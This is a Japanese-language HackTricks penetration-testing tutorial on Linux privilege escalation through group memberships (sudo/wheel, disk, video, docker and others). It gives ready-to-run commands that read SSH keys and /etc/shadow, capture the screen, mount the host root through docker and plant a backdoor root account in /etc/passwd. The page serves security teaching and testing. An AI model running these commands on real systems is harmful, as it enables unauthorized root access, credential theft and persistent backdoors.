# インタレスティンググループ - Linux Privesc

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## Sudo/Admin グループ

### **PE - メソッド1**

**時々**、**デフォルトで（または一部のソフトウェアが必要とするために）**、**/etc/sudoers**ファイルの中にこれらの行のいくつかを見つけることができます：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに所属するユーザーはsudoとして何でも実行できる**ことを意味します。

もし状況がそうであるなら、**rootになるためには単に以下を実行するだけです**:
```
sudo su
```
### PE - メソッド2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します：
```bash
find / -perm -4000 2>/dev/null
```
もし、バイナリファイル **pkexec が SUID バイナリ** であり、あなたが **sudo** もしくは **admin** グループに所属している場合、おそらく `pkexec` を使用してバイナリファイルを sudo として実行することができます。\
これは通常、**polkit ポリシー**内のグループです。このポリシーは、どのグループが `pkexec` を使用できるかを識別します。次のコマンドで確認してください。
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
以下では、どのグループが**pkexec**を実行することが許可されているか、およびいくつかのLinuxディストリビューションではデフォルトで**sudo**と**admin**のグループが表示されることがわかります。

**rootになるためには、次のコマンドを実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし**pkexec**を実行しようとして、以下の**エラー**が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないわけではなく、GUIなしで接続されていないためです**。この問題の回避策はこちらにあります：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です：

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheelグループ

**時々**、**デフォルトで**、**/etc/sudoers**ファイルの中にこの行が見つかることがあります:
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに所属するユーザーはsudoとして何でも実行できる**ことを意味します。

もし状況がそうであるなら、**rootになるためには単に以下を実行するだけです**:
```
sudo su
```
## Shadowグループ

**shadowグループ**のユーザーは、**/etc/shadow**ファイルを**読み取る**ことができます。
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## ディスクグループ

この特権は、マシン内のすべてのデータにアクセスできるため、ほぼルートアクセスと同等です。

ファイル：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意してください、debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、rootが所有するファイル（`/etc/shadow`や`/etc/passwd`など）を書き込もうとすると、「**Permission denied**」のエラーが発生します。

## Videoグループ

コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、以下のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンの端末にログインしていることを意味します。

**videoグループ**は、画面出力を表示する権限を持っています。基本的には画面を観察することができます。これを行うためには、現在の画面のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存され、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Rawイメージ**を**開く**には、**GIMP**を使用し、\*\*`screen.raw` \*\*ファイルを選択し、ファイルタイプとして**Rawイメージデータ**を選択します：

![](<../../../.gitbook/assets/image (287) (1).png>)

次に、画面で使用されている幅と高さを変更し、さまざまな画像タイプを確認します（画面をより良く表示するものを選択します）：

![](<../../../.gitbook/assets/image (288).png>)

## ルートグループ

デフォルトでは、**ルートグループのメンバー**は、特権をエスカレートするために使用できる**一部のサービス**の設定ファイルや**ライブラリ**ファイルなど、いくつかの**興味深いもの**を**変更**することができるようです...

**ルートメンバーが変更できるファイルを確認**してください：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Dockerグループ

インスタンスのボリュームにホストマシンのルートファイルシステムをマウントすることができます。そのため、インスタンスが起動するとすぐにそのボリュームに`chroot`がロードされます。これにより、実質的にマシン上でroot権限を取得することができます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最後に、前述のいずれの提案も気に入らない場合や、何らかの理由で機能しない場合（docker apiファイアウォールなど）、常に**特権コンテナを実行して脱出する**ことができます。詳細はこちらを参照してください：

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

もしdockerソケットに書き込み権限がある場合は、[**この記事を読んでdockerソケットを悪用して特権をエスカレーションする方法**](../#writable-docker-socket)**を参照してください**。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxdグループ

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Admグループ

通常、**`adm`**グループの**メンバー**は、_/var/log/_にあるログファイルを**読み取る権限**を持っています。したがって、このグループのユーザーを侵害した場合は、ログを**確認する必要があります**。

## Authグループ

OpenBSDでは、**auth**グループは通常、使用されている場合に_**/etc/skey**_と_**/var/db/yubikey**_のフォルダに書き込むことができます。これらの権限は、次のエクスプロイトを使用して特権をエスカレーションするために悪用される可能性があります：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
